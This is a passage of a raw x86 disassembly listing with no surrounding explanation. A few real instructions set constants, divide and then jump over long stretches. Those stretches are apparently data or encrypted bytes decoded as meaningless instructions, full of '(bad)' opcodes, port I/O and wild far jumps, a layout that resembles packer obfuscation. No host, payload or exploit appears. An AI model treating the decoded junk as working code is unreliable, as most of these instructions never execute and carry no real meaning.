  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	adc    DWORD PTR [edi],esp
  40d2f4:	hlt    
  40d2f5:	push   0x2d
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [esi+0xe287b29],bl
  40d303:	data16 in al,0xe
  40d306:	pop    ecx
  40d307:	jp     0x40d323
  40d309:	sbb    al,0x93
  40d30b:	icebp  
  40d30c:	loopne 0x40d2d6
  40d30e:	jmp    0xaff27b7d
  40d313:	sub    eax,0x2e59fab1
  40d318:	jl     0x40d336
  40d31a:	adc    bh,dh
  40d31c:	clc    
  40d31d:	jne    0x40d311
  40d31f:	adc    ebp,DWORD PTR [esi]
  40d321:	lods   al,BYTE PTR ds:[esi]
  40d322:	jne    0x40d2ca
  40d324:	sar    DWORD PTR [eax-0xed33e05],0xfa
  40d32b:	or     DWORD PTR [edx],0xb24ad33f
  40d331:	and    dl,BYTE PTR [esi+0x250e0d56]
  40d337:	mov    ds:0x6811465c,al
  40d33c:	mov    bl,0x29
  40d33e:	cmp    BYTE PTR [esi+edx*2+0x42],0x77
  40d343:	jae    0x40d2f3
  40d345:	fcom   DWORD PTR [eax]
  40d347:	in     al,0x59
  40d349:	dec    dl
  40d34b:	mov    ds:0x88c3354a,al
  40d350:	(bad)  
  40d351:	xor    DWORD PTR [ebp+edi*4+0x18],ebp
  40d355:	mov    edi,DWORD PTR [ebx]
  40d357:	outs   dx,DWORD PTR ds:[esi]
  40d358:	jae    0x40d34b
  40d35a:	cs aad 0xb2
  40d35d:	or     al,BYTE PTR [eax+0x252a23fe]
  40d363:	fwait
  40d364:	lock xchg ebp,eax
  40d366:	jns    0x40d33c
  40d368:	and    bh,BYTE PTR [ecx]
  40d36a:	call   0x28368d72
  40d36f:	shr    edx,0xd
  40d372:	vmwrite edi,DWORD PTR [edx+0x10]
  40d376:	outs   dx,BYTE PTR ds:[esi]
  40d377:	ja     0x40d337
  40d379:	retf   
  40d37a:	fwait
  40d37b:	scas   al,BYTE PTR es:[edi]
  40d37c:	lds    esi,FWORD PTR [edx-0x53fa3f46]
  40d382:	js     0x40d3b0
  40d384:	ss dec eax
  40d386:	jns    0x40d395
  40d388:	or     eax,0xa7a36ee
  40d38d:	jmp    0x6e3f3d9a
  40d392:	mov    edx,0x234573c2
  40d397:	mov    ds:0x4255258e,eax
  40d39c:	sar    BYTE PTR [edx-0x54816b64],cl
  40d3a2:	call   0x47b114a
  40d3a7:	repz dec ebx
  40d3a9:	mov    WORD PTR [edx],gs
  40d3ab:	lods   al,BYTE PTR ds:[esi]
  40d3ac:	pushw  ss
  40d3ae:	xor    eax,0x9c553094
  40d3b3:	test   BYTE PTR [eax-0x4e],cl
  40d3b6:	ins    DWORD PTR es:[edi],dx
  40d3b7:	bound  esi,QWORD PTR [edi]
  40d3b9:	out    dx,eax
  40d3ba:	jmp    0x40d425
  40d3bc:	ret    
  40d3bd:	xchg   ebx,eax
  40d3be:	fild   DWORD PTR [ebx+0x5b9b64d6]
  40d3c4:	xchg   BYTE PTR [edi],cl
  40d3c6:	arpl   WORD PTR [ecx-0x78b8f8de],sp
  40d3cc:	(bad)  
  40d3cd:	push   edx
  40d3ce:	je     0x40d430
  40d3d0:	in     al,dx
  40d3d1:	or     dh,bh
  40d3d3:	sub    edx,eax
  40d3d5:	push   eax
  40d3d6:	fstp   QWORD PTR [ebp+0x68]
  40d3d9:	and    eax,0x28bdd9e0
  40d3de:	imul   esp,DWORD PTR [edi],0x41f1334
  40d3e4:	ss repz jge 0x40d443
  40d3e8:	shr    BYTE PTR [ecx-0x22],0x68
  40d3ec:	sub    edi,eax
  40d3ee:	jl     0x40d3ca
  40d3f0:	add    bl,BYTE PTR [ebx-0x121c6a1e]
  40d3f6:	pop    edi
  40d3f7:	xchg   ecx,eax
  40d3f8:	bound  edi,QWORD PTR [ebx-0x4198693]
  40d3fe:	jecxz  0x40d400
  40d400:	aaa    
  40d401:	clc    
  40d402:	in     al,dx
  40d403:	and    al,0xb5
  40d405:	and    eax,0x9032cafe
  40d40a:	xchg   ecx,eax
  40d40b:	lahf   
  40d40c:	mov    cl,0x78
  40d40e:	add    al,BYTE PTR [ebx+edi*8]
  40d411:	mov    bl,0xe8
  40d413:	(bad)  
  40d414:	mov    DWORD PTR [eax+0x0],edi
  40d417:	sbb    DWORD PTR [eax+0x52175a20],esi
  40d41d:	in     al,0xce
  40d41f:	dec    esp
  40d420:	mov    al,0x46
  40d422:	ret    0x10cd
  40d425:	sar    DWORD PTR [esi+0x7ad452b8],1
  40d42b:	neg    DWORD PTR [edx-0x19]
  40d42e:	rol    cl,cl
  40d430:	in     eax,dx
  40d431:	sub    esp,eax
  40d433:	sbb    dl,BYTE PTR ss:[eax+0x37]
  40d437:	mov    eax,0xcefe52c
  40d43c:	mov    eax,0x3c9df5eb
  40d441:	pop    edx
  40d442:	inc    ecx
  40d443:	fwait
  40d444:	jmp    0x7c2f:0xd20e0c65
  40d44b:	aas    
  40d44c:	stos   BYTE PTR es:[edi],al
  40d44d:	das    
  40d44e:	aas    
  40d44f:	stos   DWORD PTR es:[edi],eax
  40d450:	bnd jp 0x40d4bc
  40d453:	and    DWORD PTR [eax-0x3e296fdc],esi
  40d459:	dec    esp
  40d45a:	cmc    
  40d45b:	mov    edx,0xaa707cd2
  40d460:	xor    eax,DWORD PTR [edx]
  40d462:	inc    esp
  40d463:	dec    edx
  40d464:	jmp    0x10d7f164
  40d469:	les    ecx,FWORD PTR [esi]
  40d46b:	dec    esi
  40d46c:	add    BYTE PTR [ecx-0x5a3a42d6],bh
  40d472:	aad    0x59
  40d474:	mov    ch,0x36
  40d476:	lods   eax,DWORD PTR ds:[esi]
  40d477:	lock stos BYTE PTR es:[edi],al
  40d479:	shl    BYTE PTR fs:[ebx-0x33c12536],1
  40d480:	xlat   BYTE PTR ds:[ebx]
  40d481:	scas   eax,DWORD PTR es:[edi]
  40d482:	out    0x6d,al
  40d484:	cdq    
  40d485:	jae    0x40d4a8
  40d487:	test   al,0x3e
  40d489:	push   edx
  40d48a:	test   eax,0x998c3346
  40d48f:	jns    0x40d497
  40d491:	mov    bl,0xf3
  40d493:	cmp    eax,0x7c4bb7a
  40d498:	lock popf 
  40d49a:	ins    BYTE PTR es:[edi],dx
  40d49b:	(bad)  
  40d49c:	mov    ebx,0xd748792b
  40d4a1:	add    eax,0xbcfeced
  40d4a6:	je     0x40d42d
  40d4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4aa:	mov    eax,DWORD PTR [edx+ebp*2+0x57b1417d]
  40d4b1:	fistp  WORD PTR [eax+0x20]
  40d4b4:	jnp    0x40d4e3
  40d4b6:	lock gs into 
  40d4b9:	cld    
  40d4ba:	int    0x82
  40d4bc:	sub    DWORD PTR [ecx],esi
  40d4be:	rcr    ebp,0xcb
  40d4c1:	jl     0x40d4cb
  40d4c3:	(bad)  
  40d4c5:	cli    
  40d4c6:	dec    ebp
  40d4c7:	or     edx,DWORD PTR [edx]
  40d4c9:	xchg   esi,eax
  40d4ca:	xor    DWORD PTR [ebx],ebx
  40d4cc:	dec    esi
  40d4cd:	neg    DWORD PTR [ebx+0x18ca5339]
  40d4d3:	imul   esi,DWORD PTR [eax+0x4d],0x49c65b6b
  40d4da:	sbb    ebp,edi
  40d4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4dd:	and    DWORD PTR [ecx+ecx*2+0x2250d63f],esi
  40d4e4:	pop    ebp
  40d4e5:	sbb    WORD PTR [esi],bx
  40d4e8:	sbb    eax,0x26785ffa
  40d4ed:	cmp    eax,DWORD PTR [ebx]
  40d4ef:	push   edi
  40d4f0:	push   eax
  40d4f1:	or     eax,0x4b95e5c5
  40d4f6:	adc    dl,BYTE PTR [ecx]
  40d4f8:	ds inc ebx
  40d4fa:	cwde   
  40d4fb:	jmp    DWORD PTR [edx]
  40d4fd:	div    DWORD PTR [ebx]
  40d4ff:	xchg   ebp,eax
  40d500:	xchg   ebx,eax
  40d501:	(bad)
  40d505:	pop    ebp
  40d506:	push   edi
  40d507:	pop    ebx
  40d508:	fninit 
  40d50a:	xchg   esp,eax
  40d50b:	jl     0x40d55a
  40d50d:	ins    DWORD PTR es:[edi],dx
  40d50e:	add    al,dl
  40d510:	fldcw  WORD PTR [esi]
  40d512:	jb     0x40d539
  40d514:	bound  ecx,QWORD PTR [edx+0x14]
  40d517:	pmaxub mm2,QWORD PTR [ebx+0x5b69a69b]
  40d51e:	out    dx,eax
  40d51f:	shr    BYTE PTR [edi-0x6fe176af],cl
  40d525:	loop   0x40d508
  40d527:	jle    0x40d57d
  40d529:	dec    esp
  40d52a:	pushf  
  40d52b:	mov    dl,0xf
  40d52d:	mov    ?,WORD PTR [ecx+edx*1+0x7b]
  40d531:	xor    DWORD PTR [ecx-0x33],0x1fcbe470
  40d538:	mov    ch,0xdd
  40d53a:	(bad)  
  40d53b:	vpsraw xmm1,xmm5,XMMWORD PTR [ebx-0x751875c6]
  40d543:	fcomp  QWORD PTR [edx]
  40d545:	inc    edx
  40d546:	jo     0x40d5a7
  40d548:	mov    ah,0xa9
  40d54a:	stc    
  40d54b:	fcmove st,st(7)
  40d54d:	mov    ah,0xd9
  40d54f:	pop    esi
  40d550:	xor    cl,BYTE PTR ds:[eax]
  40d553:	push   ebp
  40d554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d555:	jno    0x40d513
  40d557:	xchg   BYTE PTR [eax+esi*2+0x7d69f8b6],dl
  40d55e:	pop    edx
  40d55f:	mov    edi,0xd0d7e7d3
  40d564:	mov    cl,0x51
  40d566:	adc    BYTE PTR [edx+0x3f],cl
  40d569:	mov    dh,0xe8
  40d56b:	inc    BYTE PTR [esi+0x3f]
  40d56e:	sbb    ebp,0xffffffa5
  40d571:	popa   
  40d572:	pop    ss
  40d573:	pop    ebx
  40d574:	repz loopne 0x40d56b
  40d577:	popa   
  40d578:	push   esp
  40d579:	ins    DWORD PTR es:[edi],dx
  40d57a:	aaa    
  40d57b:	cwde   
  40d57c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d57d:	ins    BYTE PTR es:[edi],dx
  40d57e:	or     al,0x30
  40d580:	xchg   esp,eax
  40d581:	jle    0x40d50c
  40d583:	shl    DWORD PTR [eax],1
  40d585:	test   DWORD PTR [esi+0x2d],ebp
  40d588:	fisub  WORD PTR [eax-0x6d]
  40d58b:	shr    BYTE PTR [esi-0x71785c03],1
  40d591:	retf   
  40d592:	add    BYTE PTR [edi-0x1b],dh
  40d595:	jne    0x40d556
  40d597:	jb     0x40d5ad
  40d599:	outs   dx,BYTE PTR ds:[esi]
  40d59a:	mov    ds:0x56109114,al
  40d59f:	clc    
  40d5a0:	cmp    dl,ah
  40d5a2:	lods   al,BYTE PTR ds:[esi]
  40d5a3:	pop    ss
  40d5a4:	push   0x33e04d8b
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	mov    ebp,0xe7bc95f0
  40d5c0:	fcomp  QWORD PTR [eax]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    al,dh
  40d5c8:	jl     0x40d5c6
  40d5ca:	fistp  QWORD PTR [ecx]
  40d5cc:	inc    edi
  40d5cd:	inc    ebx
  40d5ce:	dec    ebp
  40d5cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d0:	sbb    edx,ebp
  40d5d2:	mov    ebp,0x889dcff3
  40d5d7:	mov    ds:0x4bf930a1,al
  40d5dc:	scas   eax,DWORD PTR es:[edi]
  40d5dd:	push   esp
  40d5de:	in     al,dx
  40d5df:	syscall 
  40d5e1:	mov    dl,0xa2
  40d5e3:	add    al,BYTE PTR [esi-0x7]
  40d5e6:	retf   0xb6af
  40d5e9:	mov    ecx,0x2f207960
  40d5ee:	mov    esp,0x11196852
  40d5f3:	cmp    bh,BYTE PTR [edx-0x73]
  40d5f6:	lds    ebx,FWORD PTR [eax-0x34b9f1c8]
  40d5fc:	aas    
  40d5fd:	outs   dx,BYTE PTR ds:[esi]
  40d5fe:	mov    ebp,0x225e0083
  40d603:	outs   dx,BYTE PTR ds:[esi]
  40d604:	push   eax
  40d605:	inc    eax
  40d606:	adc    esi,DWORD PTR [ebx-0x7cd45d82]
  40d60c:	sub    al,0x41
  40d60e:	int3   
  40d60f:	add    DWORD PTR [ebx-0x7df711f5],esp
  40d615:	mov    bl,0xc1
  40d617:	pop    edi
  40d618:	add    al,0x28
  40d61a:	(bad)  
  40d61b:	retf   
  40d61c:	add    DWORD PTR [edx+0x4e413a9c],edx
  40d622:	pop    ebx
  40d623:	aas    
  40d624:	aaa    
  40d625:	mov    al,ds:0xd4394517
  40d62a:	mov    ebp,0x1959faae
  40d62f:	sbb    ecx,edi
  40d631:	push   ebx
  40d632:	mov    edi,cs
  40d634:	das    
  40d635:	ror    BYTE PTR gs:[ecx+0x3a7ce337],0x8b
  40d63d:	stos   DWORD PTR es:[edi],eax
  40d63e:	dec    ebp
  40d63f:	inc    ebp
  40d640:	stc    
  40d641:	adc    edx,DWORD PTR [ecx-0x61]
  40d644:	adc    DWORD PTR [esi],esp
  40d646:	pushf  
  40d647:	ins    BYTE PTR es:[edi],dx
  40d648:	repnz sbb esp,DWORD PTR [ecx*8+0x7091b7bc]
  40d650:	(bad)  
  40d651:	popa   
  40d652:	and    BYTE PTR [edi-0x34d4a564],0x88
  40d659:	cmp    ebx,DWORD PTR [eax]
  40d65b:	add    DWORD PTR [edx-0x5319bc4b],ecx
  40d661:	int3   
  40d662:	dec    ecx
  40d663:	repnz pop ss
  40d665:	(bad)  
  40d666:	scas   al,BYTE PTR es:[edi]
  40d667:	sahf   
  40d668:	(bad)  
  40d669:	xchg   edi,eax
  40d66a:	out    0x62,eax
  40d66c:	dec    edx
  40d66d:	cwde   
  40d66e:	dec    edx
  40d66f:	scas   eax,DWORD PTR es:[edi]
  40d670:	lahf   
  40d671:	mov    esp,0x28ccf366
  40d676:	fs adc eax,0xf3e04ad5
  40d67c:	je     0x40d659
  40d67e:	add    DWORD PTR [eax],esi
  40d680:	jle    0x40d63a
  40d682:	mov    edx,0x1d0747d5
  40d687:	or     al,0xb2
  40d689:	mov    cl,0x66
  40d68b:	test   BYTE PTR [ecx],cl
  40d68d:	xor    eax,0xe598875c
  40d692:	ins    DWORD PTR es:[edi],dx
  40d693:	je     0x40d631
  40d695:	xlat   BYTE PTR ds:[ebx]
  40d696:	adc    eax,0x5e320a63
  40d69b:	cmp    ebx,DWORD PTR [eax+edi*4-0x256fdf60]
  40d6a2:	stos   DWORD PTR es:[edi],eax
  40d6a3:	das    
  40d6a4:	xchg   esi,eax
  40d6a5:	sub    dl,0x9b
  40d6a8:	mov    ch,0x8b
  40d6aa:	push   edi
  40d6ab:	mov    dl,BYTE PTR [ecx]
  40d6ad:	ins    BYTE PTR es:[edi],dx
  40d6ae:	xchg   edi,eax
  40d6af:	ficomp DWORD PTR [eax-0x50]
  40d6b2:	jmp    0xb87e:0x4f5f955d
  40d6b9:	dec    eax
  40d6ba:	cs mov ah,cl
  40d6bd:	adc    al,0x80
  40d6bf:	pop    edx
  40d6c0:	(bad)  
  40d6c1:	sbb    esi,esp
  40d6c3:	test   BYTE PTR [ecx+0x43b42dd],0x93
  40d6ca:	mov    ecx,0xf3e768b1
  40d6cf:	in     al,0x28
  40d6d1:	shl    BYTE PTR [ebp-0x526aad52],1
  40d6d7:	and    al,0x82
  40d6d9:	popa   
  40d6da:	cli    
  40d6db:	push   eax
  40d6dc:	ins    BYTE PTR es:[edi],dx
  40d6dd:	addr16 mov ecx,0xc0e40064
  40d6e3:	pop    eax
  40d6e4:	les    ecx,FWORD PTR [ecx-0x5a]
  40d6e7:	xchg   edx,eax
  40d6e8:	push   ds
  40d6e9:	stc    
  40d6ea:	test   eax,0x55ad2149
  40d6ef:	cwde   
  40d6f0:	adc    eax,0xbd91b858
  40d6f5:	rol    DWORD PTR [ebp-0x5],cl
  40d6f8:	adc    BYTE PTR [esi-0x59194491],0x8
  40d6ff:	xlat   BYTE PTR ds:[ebx]
  40d700:	mov    ecx,0x8ab3d895
  40d705:	mov    edx,0x2d0c663
  40d70a:	rcl    DWORD PTR [edi],1
  40d70c:	jecxz  0x40d777
  40d70e:	dec    BYTE PTR [esi+0x701078e1]
  40d714:	sbb    eax,0xb16fc00f
  40d719:	cmp    eax,0xeead71e7
  40d71e:	fwait
  40d71f:	shl    eax,1
  40d721:	in     al,dx
  40d722:	xchg   DWORD PTR [edi-0x31],esp
  40d725:	cmp    BYTE PTR [eax+0x29e9033f],ch
  40d72b:	add    DWORD PTR [eax],0xffffffb1
  40d72e:	mov    ds:0xadba6be8,al
  40d733:	xor    DWORD PTR [edi+0x620b5021],edx
  40d739:	ret    
  40d73a:	clc    
  40d73b:	mov    ecx,0xae412112
  40d740:	dec    ebp
  40d741:	pushf  
  40d742:	cmp    eax,0x221bbc75
  40d747:	cdq    
  40d748:	ja     0x40d7b8
  40d74a:	pop    edi
  40d74b:	fsubr  DWORD PTR [eax-0x4e46a3a3]
  40d751:	ins    BYTE PTR es:[edi],dx
  40d752:	sub    BYTE PTR [ecx+eax*8],bh
  40d755:	xor    edi,DWORD PTR [esi-0xc]
  40d758:	mov    bh,cl
  40d75a:	add    esi,ecx
  40d75c:	adc    edi,ecx
  40d75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d75f:	sbb    esi,DWORD PTR [ebx]
  40d761:	push   edi
  40d762:	inc    ebx
  40d763:	sub    al,BYTE PTR [ebp+0x28729695]
  40d769:	inc    eax
  40d76a:	(bad)  
  40d76b:	and    DWORD PTR [ebx],ecx
  40d76d:	and    eax,0x333a1ad3
  40d772:	outs   dx,BYTE PTR ds:[esi]
  40d773:	ins    BYTE PTR es:[edi],dx
  40d774:	push   es
  40d775:	mov    es,WORD PTR [eax]
  40d777:	xchg   ebp,eax
  40d778:	mov    edi,0xcd0a3a1a
  40d77d:	sbb    eax,0xc81c33e0
  40d782:	fmul   st(6),st
  40d784:	mov    al,0xec
  40d786:	shr    DWORD PTR [ebp-0x75],cl
  40d789:	leave  
  40d78a:	mov    ebx,DWORD PTR [edx-0x3e53ffe0]
  40d790:	mov    eax,ds:0xc77189d7
  40d795:	mov    dh,0xda
  40d797:	cwde   
  40d798:	stos   DWORD PTR es:[edi],eax
  40d799:	div    DWORD PTR [edi+0x6913d062]
  40d79f:	mov    cl,0xef
  40d7a1:	ss shl ebx,1
  40d7a4:	push   ebp
  40d7a5:	pusha  
  40d7a6:	aas    
  40d7a7:	jb     0x40d77b
  40d7a9:	jno    0x40d7bd
  40d7ab:	gs call 0xe7e:0xa3b8996c
  40d7b3:	cmp    DWORD PTR [ecx+0x6660b3b2],ebp
  40d7b9:	shl    BYTE PTR [esi+esi*8],1
  40d7bc:	inc    ecx
  40d7bd:	jae    0x40d7ea
  40d7bf:	loopne 0x40d82e
  40d7c1:	pop    ebp
  40d7c2:	mov    bh,0x61
  40d7c4:	add    edx,ebx
  40d7c6:	push   ds
  40d7c7:	dec    eax
  40d7c8:	or     BYTE PTR [ebx+0x2f4bc8b9],0xb8
  40d7cf:	pop    esi
  40d7d0:	xor    WORD PTR [esi-0x42ec805],0x3b
  40d7d8:	fisttp WORD PTR [esi+esi*4+0x5f]
  40d7dc:	cmp    BYTE PTR [ebp+0x6def9575],bl
  40d7e2:	clc    
  40d7e3:	jnp    0x40d7ad
  40d7e5:	les    esp,FWORD PTR [edx]
  40d7e7:	mul    DWORD PTR [ebp+0x27]
  40d7ea:	pop    ds
  40d7eb:	mov    BYTE PTR [ebp+0x25],dl
  40d7ee:	cld    
  40d7ef:	por    mm5,QWORD PTR [ecx+0x4a4e756f]
  40d7f6:	scas   eax,DWORD PTR es:[edi]
  40d7f7:	and    ah,0x21
  40d7fa:	std    
  40d7fb:	push   edx
  40d7fc:	enter  0x725,0xde
  40d800:	jle    0x40d81d
  40d802:	jne    0x40d827
  40d804:	lds    ebx,FWORD PTR [ecx+0x118fd8a8]
  40d80a:	fwait
  40d80b:	push   edi
  40d80c:	inc    ecx
  40d80d:	pop    ecx
  40d80e:	stc    
  40d80f:	sub    esp,esp
  40d811:	js     0x40d819
  40d813:	call   FWORD PTR [ecx+esi*4]
  40d816:	fldenv [edx-0x76]
  40d819:	mov    bl,0xfc
  40d81b:	mov    ch,0x8a
  40d81d:	sub    al,0xc5
  40d81f:	and    al,0xde
  40d821:	ret    0xd10e
  40d824:	push   cs
  40d825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d826:	rol    BYTE PTR [edx+0x29],0x4d
  40d82a:	in     eax,dx
  40d82b:	rol    DWORD PTR [edx],0xb2
  40d82e:	fsubr  DWORD PTR [edx-0x52]
  40d831:	mov    dl,0x49
  40d833:	push   0xffffff95
  40d835:	les    esp,FWORD PTR [ebp+0x6c1d7f7f]
  40d83b:	in     al,0xe8
  40d83d:	add    edx,DWORD PTR [ebp+edi*2-0x7c5e5ce2]
  40d844:	loope  0x40d7d6
  40d846:	xor    al,0x10
  40d848:	(bad)  
  40d849:	out    0x91,al
  40d84b:	fsub   DWORD PTR ds:0xfc305bfc
  40d851:	and    eax,0xb1174a31
  40d856:	sti    
  40d857:	loop   0x40d7fa
  40d859:	mov    ah,0x45
  40d85b:	sbb    BYTE PTR [eax+0x3],dl
  40d85e:	mov    ebx,0x1f554e0b
  40d863:	aad    0x13
  40d865:	or     al,0x41
  40d867:	xchg   ebp,eax
  40d868:	push   0xffffffda
  40d86a:	xor    eax,0xbfd62373
  40d86f:	mov    ch,0x4d
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x1680f5bc
  40d894:	stos   BYTE PTR es:[edi],al
  40d895:	mov    al,ds:0xd21818d8
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [eax-0x40],dl
  40d89f:	push   ss
  40d8a0:	sub    DWORD PTR ds:0xea5e523d,esp
  40d8a6:	clc    
  40d8a7:	jnp    0x40d88e
  40d8a9:	out    dx,eax
  40d8aa:	jnp    0x40d90b
  40d8ac:	mov    edi,0x52e8b81f
  40d8b1:	adc    DWORD PTR [edx],0x1a8108d5
  40d8b7:	and    al,0x17
  40d8b9:	(bad)  
  40d8bb:	add    esp,DWORD PTR [edi+0x20]
  40d8be:	push   esp
  40d8bf:	add    ecx,ebx
  40d8c1:	jl     0x40d897
  40d8c3:	(bad)  
  40d8c4:	jns    0x40d89e
  40d8c6:	aam    0x8f
  40d8c8:	ss (bad) 
  40d8ca:	cmp    eax,0x2806e736
  40d8cf:	iret   
  40d8d0:	xchg   esp,eax
  40d8d1:	mov    cl,0x19
  40d8d3:	cmp    DWORD PTR [eax-0x51625bca],edi
  40d8d9:	fsub   st(2),st
  40d8db:	mov    ?,WORD PTR [edx-0x380ba54]
  40d8e1:	scas   eax,DWORD PTR es:[edi]
  40d8e2:	fbstp  TBYTE PTR [edx+0x19]
  40d8e5:	clc    
  40d8e6:	mov    BYTE PTR [ebp-0x75b2f85d],bl
  40d8ec:	out    0xd1,al
  40d8ee:	ret    
  40d8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f0:	dec    edx
  40d8f1:	mov    eax,ds:0xcd3641d7
  40d8f6:	(bad)  [edx+0x21]
  40d8f9:	push   esp
  40d8fa:	inc    esp
  40d8fb:	xchg   esp,eax
  40d8fc:	and    BYTE PTR [esi],dh
  40d8fe:	aad    0xc1
  40d900:	xlat   BYTE PTR ds:[ebx]
  40d901:	cmp    bl,BYTE PTR ss:0xb884ebd9
  40d908:	jecxz  0x40d978
  40d90a:	jg     0x40d930
  40d90c:	repnz sti 
  40d90e:	xor    eax,DWORD PTR [eax-0x33725a42]
  40d914:	jle    0x40d8bc
  40d916:	aad    0x57
  40d918:	inc    esp
  40d919:	mov    esp,0x21e9ed5c
  40d91e:	test   DWORD PTR [edi],edx
  40d920:	es mov esp,0x9239049d
  40d926:	enter  0x5ea2,0xeb
  40d92a:	call   0x2961:0x353ef2dc
  40d931:	jmp    FWORD PTR [edx-0x2d5fdde1]
  40d937:	popa   
  40d938:	jnp    0x40d99e
  40d93a:	leave  
  40d93b:	mov    bl,0xbb
  40d93d:	xchg   ebp,eax
  40d93e:	outs   dx,BYTE PTR ds:[esi]
  40d93f:	jp     0x40d947
  40d941:	repnz xor ecx,DWORD PTR [ecx-0x6be41e5d]
  40d948:	push   ebx
  40d949:	push   ecx
  40d94a:	scas   eax,DWORD PTR es:[edi]
  40d94b:	arpl   cx,ax
  40d94d:	sub    eax,0x2b3e64ff
  40d952:	xor    dh,dh
  40d954:	inc    ecx
  40d955:	fisttp QWORD PTR [edx+ebp*4-0x213a6858]
  40d95c:	leave  
  40d95d:	jo     0x40d98c
  40d95f:	mov    al,ds:0x272c6a5c
  40d964:	add    BYTE PTR [ebp+0x4d],bh
  40d967:	pusha  
  40d968:	in     eax,dx
  40d969:	gs gs xchg edi,eax
  40d96d:	inc    ebp
  40d96e:	mov    ebx,0x1db3b3f1
  40d973:	add    eax,0x227d8d62
  40d978:	fnsave [esi*1+0x6a8c163a]
  40d97f:	aaa    
  40d980:	jmp    0xb061abc3
  40d985:	scas   al,BYTE PTR es:[edi]
  40d986:	sbb    al,0xe2
  40d988:	mov    ebp,0xcef73109
  40d98d:	sub    BYTE PTR ds:0x62122b,0xd0
  40d994:	push   0xffffff97
  40d996:	neg    DWORD PTR [edx-0x41]
  40d999:	loope  0x40d9ea
  40d99b:	in     eax,0x6c
  40d99d:	or     eax,DWORD PTR [esi-0x6d]
  40d9a0:	lahf   
  40d9a1:	das    
  40d9a2:	fisttp WORD PTR [edi-0x63dc9c7b]
  40d9a8:	rcl    DWORD PTR [ebp+0x4df11f2e],0x60
  40d9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9b0:	out    dx,al
  40d9b1:	mov    ch,0x94
  40d9b3:	ins    BYTE PTR es:[edi],dx
  40d9b4:	icebp  
  40d9b5:	fdivr  QWORD PTR [eax+0x4a]
  40d9b8:	aam    0x11
  40d9ba:	or     bl,BYTE PTR [ebp-0x62]
  40d9bd:	adc    DWORD PTR [edi+0x6b11726c],ebx
  40d9c3:	dec    ecx
  40d9c4:	jmp    0x6c29:0x88fe2f2d
  40d9cb:	mov    eax,0xecfbedb8
  40d9d0:	mov    dh,0x90
  40d9d2:	ss aam 0x1b
  40d9d5:	out    0xcd,al
  40d9d7:	int3   
  40d9d8:	sub    dh,BYTE PTR [edx]
  40d9da:	enter  0xd14e,0xa1
  40d9de:	mov    ecx,0x38cfd4a
  40d9e3:	jp     0x40d9f6
  40d9e5:	shr    BYTE PTR [edi*2+0x19cb7b7d],1
  40d9ec:	mov    dl,0xe5
  40d9ee:	mov    dl,0xdc
  40d9f0:	scas   al,BYTE PTR es:[edi]
  40d9f1:	pop    edx
  40d9f2:	add    dl,dl
  40d9f4:	pop    eax
  40d9f5:	cmp    al,0xf2
  40d9f7:	xchg   ebx,eax
  40d9f8:	mov    al,ds:0x2da329fc
  40d9fd:	dec    ecx
  40d9fe:	jno    0x40da5e
  40da00:	push   edi
  40da01:	xor    ecx,eax
  40da03:	scas   al,BYTE PTR es:[edi]
  40da04:	mov    ah,0x2c
  40da06:	inc    ecx
  40da07:	push   0x12224cc8
  40da0c:	or     DWORD PTR [ecx-0x1f153042],0xffffffaf
  40da13:	push   edx
  40da14:	shl    ch,0xb5
  40da17:	pop    es
  40da18:	sbb    eax,0xda96ec2b
  40da1d:	repnz mov eax,0x63f74aaa
  40da23:	push   esi
  40da24:	scas   al,BYTE PTR es:[edi]
  40da25:	(bad)  
  40da26:	inc    eax
  40da27:	or     DWORD PTR [edi],ebx
